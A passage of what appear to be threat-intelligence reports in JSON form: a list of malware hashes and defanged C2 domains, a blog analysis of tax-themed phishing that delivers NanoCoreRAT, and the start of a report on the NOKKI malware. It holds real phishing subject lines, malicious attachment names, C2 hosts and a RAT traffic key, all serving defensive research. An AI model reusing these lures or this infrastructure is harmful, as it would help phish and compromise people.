                "4f51b180a6d0b074778d055580788dc33c9e1fd2e49f3c9a19793245a8671cba - Microsoft.vbs"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "feec28c7c19a8d0ebdca8fcfc0415ae79ef08362bd72304a99eeea55c8871e21 -        - 9 - 9 - 2019.doc (Daily report on the most important Palestinian developments, 9-9-2019.doc)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "bf126c2c8f7d4263c78f4b97857912a3c1e87c73fee3f18095d58ef5053f2959 -       - 9 - 9 - 2019.doc (Daily updates on the latest terrorism report Alaalmi- 9 - 9 - 2019.doc)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "243f1301d1d759c17cd49336512ebceb9d347995c90a6e00aff926439d63f12d - Daily Report.rar"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "602828399e24dca9259a4fc4c26f07408d1e0a638c015109c6c84986dc442ebb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "eaf2ba0d78c0fda95f0cf53daac9a89d0434cf8df47fe831165b19b4e3568000"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "273aa20c4857d98cfa51ae52a1c21bf871c0f9cd0bf55d5e58caba5d1829846f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "71ea0ba573451b14bb411ad28e5aac883f8af0376db8c9d34f309778c901c5d6"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a0ae5cc0659693e4c49d3597d5191923fcfb54040b9b5c8229e4c46b9330c367"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8c0966c9518a7ec5bd1ed969222b2bcf9420295450b7ed2f45972e766d26ded8"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb128"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "64ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eff6122c431"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e8d73a94d8ff18c7791bf4547bc4ee2d3f62082c594d3c3cf7d640f7bbd15614"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6e60f5c65299ee7f7b257f5c83d3bb36154654b26e721136f7184514fcf6b296"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b08b8fddb9dd940a8ab91c9cb29db9bb611a5c533c9489fb99e36c43b4df1eca"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a6e0297777ba29e21e5d1acca6210d436eee5c2b93d2dec27910ffd6e2266559"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6e896099a3ceb563f43f49a255672cfd14d88799f29617aa362ecd2128446a47"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cf32479ed30ae959c4ec8a286bb039425d174062b26054c80572b4625646c551"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "92d0c5f5ecffd3d3cfda6355817f4410b0daa3095f2445a8574e43d67cdca0b7"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5139a334d5629c598325787fc43a2924d38d3c005bffd93afb7258a4a9a8d8b3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "89acce7cdd354a04f2edd4a2226caf5c47246a8196ec1d9b98159da38ec20c24"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b654dd768912e09b9c71eb388995b1d69b5baa45e970a6afc42733d647220712"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "daa72ba2b9525d74e0a3564d0d72e06eed27d04ce63fe98c45b1e84cee09987c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c39e3adb6e15b9964bf0f9702b632086951b4ed9f9fb9cadd6975962a031a398"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "255a29f88150285a9553f67a6475dc50fcbb5fc737a0178cc0e737d49c8d1b20"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4889318807225e51bae4d9d9a536e5775eaf92685b289eef6839f9d89f8c4b85"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "23cf013ab91e6bd964c4d9a5d48c188a09838c32a75db68dd0690418f5ca7e7c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "75336b05443b94474434982fc53778d5e6e9e7fabaddae596af42a15fceb04e9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9a3ec0a8b2a88106fc537d9cae1989f6fba36bb43352a944d2031e7b2ab7673c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "89d7337ac102cd80316ad59a1dcfcc5c7849d0e7520f0f85e1781574423e38ea"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "19ede61c865a3cdd59d3a5d1a79b7ce83ca7828a6b80a2f968d82b5b56a8603c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f9df76f634586c698b967209d83834b98ff3d245d47d6993bfb27a0aa819d9b9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "704b19e0460a0fa7d952ba6feb5eadb9054895d1d753df72faf6f470446a0519"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "194c236a3eed81f3180bdcc5bcbd29b782b1a0ef7962ceb1c4cb892a427563ff"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fc420a49b1e9e2200238a4846110c2e4e63bfe6d7088645f49ebb65718a70b7f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "bc9353adc58b983b080b61950fc6689ee340797458fc4fd8a1d6f492976aa0e2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8c6dc796b35ef405c42c78e1011cc4a6df09315264d638271cb0674d044886cf"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9d49020debdc6ab63de249fd9289d51415395fc8b1e8a15a82f200bf90e674ee"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5b6e43d434148bfcf52fd441f64836ae35f4f0ed9d75bf9707f521bcbb7c0380"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3a32c81ec609a5466f050c09156f25b5561c691763f865ee437e95a246dcbbe1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c3e23a42dc49b039828da6cef4ebb7226c85163651a69085ee7e1899aa804fed"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "26b032a9b6a22047eb48f1fb1553827a5b85aa7229422d650fa1f37c48b3aeb1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8e5bf597948ea6ad39f0030053978d1a14e1c3dbb4abf044a223e14544c73b7f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1513032544512718d068b2f6e8b5087cae9fc446e40cd56c03ab7bbbe047add5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d04276760d722c241e831dacee7cf9d63cb123ce7188d604df1c56c1197d7160"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "83750372d4e8c043d6f916ec398303dc929b59e05b7f5a9dc5485e4530047f4a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "23cf013ab91e6bd964c4d9a5d48c188a09838c32a75db68dd0690418f5ca7e7c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "bf4cdb277881754db2f44a014c08ce1857c9c0c47c6c1c8582782b5c887241e2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "58376e763ef0ca9dccad55e043794b5ec0b34c8c2a20604cff0b26f216e3c1e2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "399344aa609f17e558356709a398b4478e5c737c7cc843e3d111d33192c35e5a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1c43f8f68f7b8e40828f9f74566860b25a5dfd9b7f8b7620d71644866e6cb19d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ab2335ba3abe97a02a3a2d1b063a08ae649406f88d4cf02d22d724e649b9e7be"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a4c6aea61953d515d38d75ae7b3ef2a37bb26d1f838722f0a67624d6a728549e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "51c1e6ce3ff1f42734bfa19a7142b5154172232afc5528dad4c527df3a44c0c1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "329e9e98f08f3d6a017254dd033984cfd6421ccab5b323ebace5d68662a98a09"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0631ed0995e21ec8f02f6167824eca92e84abfd8cf4dbbd9c7c88f88d4f570cd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d010ef2b6664779b3c8cfa0a5179b7331d88d34d04350ebeeecb3bae65654393"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4889318807225e51bae4d9d9a536e5775eaf92685b289eef6839f9d89f8c4b85"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "51042cac30b4d6072f79b3f9b27d8ee7b65f438549c90f57dc5fecc17d35054a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ec0d30d2fdd301bf0cfe66028c9a37d5535a8161909d0d3573447d1843f61c97"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e6e5593cbac23ec5c51e5f63c4c6616a8eb71697a89f9d1d17cc7be91c36e3e9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "36166db096ddb50af4f5c4be48b4274c535f40c74ce3450d4ad3bdaa2c28beb3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "966ad6452793b1562f0081456a951d3310d4e7690fa74ef8ff4046778bd37168"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b2437a54195d51435ad07867a5cb069e831fdd8e48bb70daa3894fde40754bc8"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fe19ab4fd65531163d197d565201c2afea7d9f8e74e5f75c714eb5fe086a02fd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "212aa6e3f236550bb4b9328071ee4f0e8a74465c75dcf1e6cde8502afde91364"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e489e5297ed8cf594c2a5160eff79b12b9ee68e36e0d00ed31f44b75c4a38f61"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0eebc31bb64ba0aa0ea335a5f35392ff1d058e97bf5cb5b46d7a89b197dcba7a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fe0f23d6675260dd40f277906aa3dd34cbef2243336334dda10ad4500f8e6883"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7c5a9ce04002be953c556b5b50c10f8d462abc92d1ffe28a325d7ea741701be1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "45a2c50edd710476e0de8ece6cc5931035ce8183ac4cf521d494d94744d44c2c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b84f2497e4cfeac240b1815b22741609e5a31f0be11667a3c7256c16788728ec"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "78696cf4370817cb0ffd6930a92553d3551fe77cdc6d45638ddd13f05b9218b8"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5109f2c8f014698f1d2f0d59a7c9cc1cd9400a6fe4dcde95cc475f453e74bc6e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ab4e43b4e526d44bf12ae5113184afdf5c15630808f674f5e1a472eb6811ce3f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "daa72ba2b9525d74e0a3564d0d72e06eed27d04ce63fe98c45b1e84cee09987c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "64ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eff6122c431"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6e60f5c65299ee7f7b257f5c83d3bb36154654b26e721136f7184514fcf6b296"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "B08b8fddb9dd940a8ab91c9cb29db9bb611a5c533c9489fb99e36c43b4df1eca"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cf32479ed30ae959c4ec8a286bb039425d174062b26054c80572b4625646c551"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9511940ed52775aef969fba004678f4c142b33e2dd631a0e8f4e536ab0b811db"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e3779f6252ca606ace9ae06623ba086d1a441582b625e433799260d71cdb1b4b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e6e9f7b0449976537d9276192e5767c9909cd34df028a8bf1cac3dbe490f0e73"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "69df8e4bdc3fd69deb6c866254f80f6288549222ed0d07ccd4c05597e75414df"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "40b7a1e8c00deb6d26f28bbdd3e9abe0a483873a4a530742bb65faace89ffd11"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "servicebios[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "dapoerwedding[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "zmartco[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "webtutorialz[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "nysura[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "laceibagrafica[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "motoqu[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "smartweb9[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "laptower[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "app.msexchanges16[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "msexchange13[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cloudserviceapi[.]online"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "updates.masterservices[.]online"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "clients.itresolver[.]online"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "update.itresolver[.]online"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "91.219.237[.]99"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "goldenlines[.]site"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Update.nextdata[.]site"
            ]
        }
    ],
    "c4c3cb289c7fc0a41dc13b8db219f5a8b4db82b8": [
        {
            "type": "paragraph",
            "content": [
                "It seems every mainstream news event or holiday has an accompanying phishing campaign.",
                "Opportunistic actors hoping to capitalize on the public's attention are often seen sending phishing e-mails with themes related to the news or the season.."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It happened this last holiday season and will likely continue to occur as long as email is around."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unsurprisingly, as we near the U.S. deadline for filing our income taxes, Palo Alto Networks researchers have seen an increase in phishing emails specifically related to taxes.",
                "This blog details some recent trends we have been able to identify.",
                "Palo Alto Networks noticed both executable attachments and Microsoft Word documents with macros designed to download and execute files."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Looking through recent email attachments determined to be malicious by WildFire, we noticed a trend in subject lines involving tax forms using the keywords report, tax, secure and pin.",
                "Pivoting from subject lines to the hash values and filenames of attachments included in the emails allowed us to expand our initial sample set.",
                "Finally, using the AutoFocus API and a bit of Python we were able to collect data about the samples included in the tax-themed phishing and build a data frame for further analysis."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Within the final sample set, we were able to identify 70 unique malware samples distributed through 2,062 email sessions between September 2, 2015 and January 28, 2016.",
                "As expected, email sender addresses were often spoofed to provide a sense of legitimacy."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Some examples of email sender addresses:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We also noticed the source IP address of the emails primarily came from a free mail service called mail2world.",
                "The top 5 source IP addresses by session count were:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While some of the phishing email attachments were PE files, others were MS Word documents with malicious macros.",
                "One sample (119f3dd48e316f77974a7ec84c0fdecd943ceed77c30db9a6df0c1b0615b0ac0) included instructions on how to enable macros."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Using open source tools, the obfuscated file download functionality is easily located in the Word macro."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Looking at the malware contained in each email attachment, the payloads consisted predominantly of NanoCoreRAT or a generic macro downloader that would then download and execute NanoCoreRAT.",
                "The countries receiving these phishing messages align with what are believed to be country code indicators in malicious URLs and email attachment names."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Recipients of Tax-Based Phishing E-mails"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Analyzing the malicious macro documents we observed for these tax-themed phishing attacks revealed that although there were a large number of unique samples, their behavior and infrastructure contained significant overlap."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the above figure, we can easily see that six domains were in heavy use by most samples."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Second-stage download:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "NanoCoreRAT Command and Control:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "NanoCore is a commodity trojan developed in the .NET framework.",
                "According to Symantec, a fully cracked version of NanoCore 1.2.2.0 with premium plugins was released around March 2015 and has been seen targeting the energy sector.",
                "This release caused NanoCore to become increasingly popular with adversaries, especially the more frugal ones.",
                "Around April 2015 we observed a rise in activity involving NanoCore.",
                "We have observed its incorporation into tax-themed phishing since June 2015 and are continuing to see a general increase in activity since then.",
                "Below shows the upward trend Palo Alto Networks has seen in NanoCoreRAT being distributed since September 2014."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "NanoCore is a modular RAT with many of its capabilities provided through plugins.",
                "Capabilities provided by the premium plugins we could identify include:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The plugins available to a NanoCoreRAT sample are encrypted and stored in the resource section of the PE file."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Using dnSpy as a debugger, we extracted the plugins included in sample 758f255abc102d53b7a4e8a8902da57076db9889cb80e81e8f1a344056f00c59 by setting breakpoints on all Assembly.Load calls, running the sample, and manually dumping the raw assembly bytes passed to those functions to disk as DLLs."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Most of the plugins included in this sample were obfuscated with Eazfuscater.NET 3.3 and easily deobfuscated using de4dot."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "NanoCoreRAT uses a custom TCP protocol to connect to a server specified by the attacker on the port of their choosing.",
                "Below is the encrypted traffic sent by one sample to 54.152.254.8 on TCP port 4782:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This sample uses DES to encrypt the traffic.",
                "It creates DESCryptoServiceProvider with a key from the Assembly Resource Guide Attribute and bytes from the resource section."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The DES key for this sample is 72 20 18 78 8C 29 48 97, we can use it to decrypt the traffic into the following:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "00 00 00 00 12 DD DF 82 E7 AE 59 ED 45 B3 F4 E2 B5 7D 53 A5 EE 0C 14 57 49 4E 2D 48 55 46 44 39 33 41 52 36 32 32 5C",
                "6A 6F 68",
                "6E 0C 07 44 65 66 61 75 6C 74 0C 07 31 2E 32 2E 32 2E 30\n.....\u00dd\u00df\u201a\u00e7\u00aeY\u00edE\u00b3\u00f4\u00e2\u00b5}S\u00a5\u00ee..WIN-HUFD93AR622\\john..Default..1.2.2.0\nSystem Guid ComputerName\\Username RAT Group Version"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The bytes are stored in array2 and are encrypted with the following code and stored in the byte array named buffer."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "NanoCore can output messages to a console if the EnableDebugMode parameter is enabled in the RATs configuration."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Phishing is often how threat attackers gain access to targeted systems and user awareness is the first line of defense.",
                "Phishing isn't new but the increased distribution of the full-featured NanoCoreRAT implants is.",
                "Users should be made aware of the dangers that enabling macros poses.",
                "We have observed macro-based attacks on the rise in October of 2014"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers with WildFire turned on would have been alerted to the presence of this threat on their networks.",
                "AutoFocus customers are able to further research both tax-themed phishing and NanoCoreRAT samples and trends."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "[",
                "Attention] Your 2014 Tax Report"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "[Urgent Attention] Your 2015 Secure IP PIN"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "[",
                "ATO: URGENT] Your 2014 Tax Return Report!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "[",
                "URGENT ATTENTION] Your 2014 Tax Return!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "[",
                "ATO: ATTENTION] Your 2015 Tax Return PIN!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "[",
                "IRS ATTENTION] Your 2015 Secure IP PIN!!!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "[HMRC ATTENTION] Your 2015 Tax Report PIN!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "[",
                "ATTENTION] Your 2015 Tax Return PIN!!!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IRSReport.doc\nCATAXREPORT.doc\n2015TaxPIN.pdf.exe\n[CRA]Report.pdf.exe\nSGTAXREPORT.doc\n[CRA]TaxReport.doc\n[IRS]TaxReport.doc\n[HMRC]TaxReport.doc\nTaxReport!!.doc\nSGTAXREPORT.pdf.exe\n[CRA]ReadReport.doc\nUKTaxReturnReport.pdf.exe\nCATaxReturnReport.pdf.exe\n[CA]Report.pdf.exe\n[BE]TaxReport.pdf.exe\nUS2015TaxPIN.doc\nAUTaxReport.pdf.exe\nAU2015TaxPIN.doc\n2015TaxPIN.doc\nCRA-Report.doc.exe\nTaxReport.doc\nUKTAXREPORT.doc\nAUTAXREPORT.doc\nCATaxreturn.doc\n[CRA]Report!.pdf.exe\nFRTaxReport.pdf.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b633e5b9d6961f63dbf07ccd864903948a3c0772f2f66f86ad42c5b1faa0c539\na1bc606d12db420c511ba94f042021d34d84ba98a16c016445632ed03d37f909\nbbbc92b4ebab54a3b7e35168a0e89ecbae701d3a04ea0df9bb5c132fcb8fa2aa\na89dd66865554cbe2b1ea6ff18653e964ac48ef585458d7f2d18f3083d039b39\n6c1eb38781214b88cc9f9eb702ad9655f32e033ffa493e0954100b6be9c12d98\n4b1b9fa256a6e6473c5ca25ce30ccdb4f955abb5e620d219dce85152d9e440ed\nd910ffe4bb03c3b0066877b75c8ce5f5bc7ad1ae74908d96f7571bb75bf485f3\na827613e8a9d69f6401a25690e2282722b901b31f748c1ed2766e680bc14e77c\nba37d89a20a944cdee5cc4bd146cc225124091f9a576b1c5d6fa0239f3628b38\nfc8da8715a9cab9643c63c7dacf83613478b11b2fc758d2b3b989ffbba9b93af\n899e395fd22b8dc909a26c8fb380eac00e51e2b8766ef363d2a1c75335a40591\nc4e0c88aa4c1a3da9a21114b22b546e238643146603ca667ea2158f142149507\nb13305fe5d3c9e904ffe8d39fcc363f4fa799f5c57c854bf5a5e1ce9307942a4\n200b1ed7f776d4ee32430ffdffefc76c44f359c19a7dff90e5b5ecdbef8e5608\n3f1fc0757542fd80f216753d34ec27569f826d690a520d16017cd6f35acb4be8\nfbcb8f3de748be39c396deea1f172213ff203f3997c575b017ed5e6e2c46ba18\n119f3dd48e316f77974a7ec84c0fdecd943ceed77c30db9a6df0c1b0615b0ac0\n71755fd086ccf44e384d59e91234906403aaf28d73fea96ffa052187c2824b6a\ne2c3c2949f12556b5df7ead551eea2e9a0827dafdf385be2d1f470ba768be4f0\n283152ea205f4098e221b6dab94e5c61619d507b4e8ad3613f7df4ffac35ba88\n23067c7dd27eeeab574aa7cf65fd2b287c2ff794aed3589ff89419a71b740afd\nea97f1c48ed8e91e5e53683417893dc99f620acbd90b20b069e891c8875fa3ee\n11b2db6fe850cbd373b5222e2512603e3bda0be749910e15d2961a373d56dde8\n09a73ceeaf543a7741503c477af939aa59d13ba1d81983844a4b94bdfa27396a\n6d3917640123e89a714cb0f165c91ae3ffcf8b7bb6321c57c96684952982fbef\n4f60ebf97267480ab084e0851759b18111427e63628ba89a0deaea24c987cf3c\n0175575982f1d298b980583cd48d3d7cdc14ce944352fd259a76f46a58bc609b\n371fa8f45c0203d3470db7518571a8ced1070d2836e3d697e02c614d0b6fe401\na222d3095d93afbbc59f15ef9fce75dcfbd19eb9d619a8536fd8e49935220319\n657758c09948c3203283fe61de51a31af77115e30b1f0e0b0296d40f97a2d615\nd60d17f39de0d9298eb629d68276198793a16780260340fb8a2af35087a0ffa1\n323cde2a163b8296159637c536c349756fccc2cf356fa084eb42dc5756627a4a\n572b7dd0a742c5efda10b6ae40e764eb81db1add5736d14dd6dd9e091c711475\n48912c24f24ea296ca00be255a9c8a27b8dd3c7b2755c0a562018e0f04ca5fc1\ne18ba8f98204e754e66d3ab5b5bddef80d0a8e924cf29342ec746570d113d0ce\nf10a42a4f135adf7e71b9f23454bf57d616cb5373135b7a70334f1a8921b12a2\nfa4f12d6aa94d6196b68e304e31d7365c2ebeff465f87012c233d366f08abfed\n326ba05909dc6244e00253ef610aea8904b935c617802d492d889363e3f27fa7\n82c9b0b1076fb2709711142a62d04601896606bdb1647ae1a4e51d2158475138\n6e21a9823b5b7ee7c6a2a7d2323afbd9693cd141cf9d1f80f2030b16a0df0937\n5071acb947d01fc7298df97480a5701bfd1c15e629c7ddfe70c75fd8b3bc9b31\nca06f69759d2e331a1355af447daa857a5ca5bd8e7dd3d25d5c11f58c4a3cd0e\n40ee213a2b2b26c5c48501e159dc30151d2a31056f4c9a32e256c397bf875b85\n822445be43d5e383971ed3b9a63a9f4c17d0e8d067986cecd14e537f71a0e4f0\n798e0e897035d4b821364435e6eaf620181b8096df65d73aea85ef84d7fd5c2c\n80771e4e8155602b5e40aded581f1e141355942a5c8236ddbfcd9983ec8e4bfd\nb5240a38cab5eea7610e902ac7e62b41c255d82eaaad7cfb39cd49029bf50804\n8d6146bc12d170162ff2b542cf56b07aa91c970416b38ef274a95cd4ecb10063\n6e15e471b76fea17cae4aea600a61680d53a8f857489bc818a7b88092bfdb724\n96ffab6bc9b0d9f2d2e0388aea2c13a263e11c708bca309d5f3b1ffe77a5be5c\n7c7434fc496f7cae0185e4ec40a17b41d24f8a2fdbeae9e64998426a1063e26b\nd1778dd50c2a906bcc8e53372045dd3d976d5071ef8b3817ec28627fc0f4d8df\n83f29a170ffcb9f13e630e1b240cfb0c75ff6854740ccf700e83af40a2dc770b\n677ec33db3d3e9b20894bfc1280d3a9944413434cf4eae844d6f79d49bc372bd\n6a8c5e6026e6a5d4561d4006ae7a3f0ab82d5ba4deb21c904684a6c3a5c75a7c\n3118ca1232a55ee0d718c5efb2590d3af0a19d6a3861f4c7c56ecf0dcc3a8083\n4eca6ea67d389ce85e41804bdb23acd7e34e585b3b92ce521636ffa35d877e32\nfc83728faf8ca614e2798d64ed2eca2691354bf83ff5726d52badcd44787db14\n87971bb9bdaea061ebea3d6903d6df359a13713e0d5aeda0a3fee0df852c3799\n44b6807e0ea21d7f41ca09fa04a8bd1192fd568364a3ac5ba12a7c0de7d57a9d\n455705d79026ddfc758cf069267b6975c677e2a28a0f553baca91a3f95d6dbbc\n37160143a5064b505f050d8d37fbd2d2492c62afa599c9bbe0a6c5f0e20f3300\nd175d0c65acebb61bdefd3e498bb24761c6ffd67c401060649d094e9a7d7753b\nbf1e3483ec56fb480a88c6208f5ba2e51a69361b8cb26b8002f4c3bc562996fb\n73935900282967ad8d1d0822f46c49cd69ae49e15bf63435db5074b6d932ba01\na34a3e1d0e427c9b112bd647fc5b53f1f8401e12bdcf16d6076dbc17fcaa7537\nb11ac7fcb5d0427b922a8f6ba0bf6078647cb8bf3bed11ca43dc30f0f30157f2\n6335b913b0a900e67155dab585249c1861912116bd53bb46055ee966511f97a8\ncdc350df224011bd95f8fc04cfe355b44f1a3732ea7683339227baaa89a7935e\n161a7c71330f0088b5bc06cc2a80fb1217e1a834d8ca87e749cdafa64f521bc5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "agor0020.gotdns.ch\nbtint.net16.net\ndawood00.no-ip.org\ndawood01.ddns.net\ndawood02.no-ip.org\nwww.cnw-inc.com\nwww.iphonetechie.com\nwww.pantech224.firstcom.com.sg\nwww.secretchamber.sg"
            ]
        }
    ],
    "f34803865a41aff8c8cab605e33eae00858b946d": [
        {
            "type": "paragraph",
            "content": [
                "Introduction"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Beginning in early 2018, Unit 42 observed a series of attacks using a previously unreported malware family, which we have named NOKKI.",
                "The malware in question has ties to a previously reported malware family named KONNI, however, after careful consideration, we believe enough differences are present to introduce a different malware family name.",
                "To reflect the close relationship with KONNI, we chose NOKKI, swapping KONNIs Ns and Ks."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Because of code overlap found within both malware families, as well as infrastructure overlap, we believe the threat actors responsible for KONNI are very likely also responsible for NOKKI.",
                "Previous reports stated it was likely KONNI had been in use for over three years in multiple campaigns with a heavy interest in the Korean peninsula and surrounding areas.",
                "As of this writing, it is not certain if the KONNI or NOKKI operators are related to known adversary groups operating in the regions of interest, although there is evidence of a tenuous relationship with a group known as Reaper."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The latest activity leveraging the NOKKI payload likely targets politically-motivated victims in Eurasia and possibly Southeast Asia.",
                "These attacks leverage compromised legitimate infrastructure for both delivery and command and control (C2).",
                "These compromised servers are largely located within South Korea.",
                "In total, we observed two waves of attacks spanning from early 2018 to at least July 2018 which we were able to cluster via the specific network protocol used for C2.",
                "In addition, the decoy documents themselves wer both created and last modified by an author named zeus.",
                "The zeus username is a recurring artifact witnessed in all of the discussed attacks in this report."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "January 2018 Attack"
            ]
        },
        {
            "type": "paragraph",
            "content": [
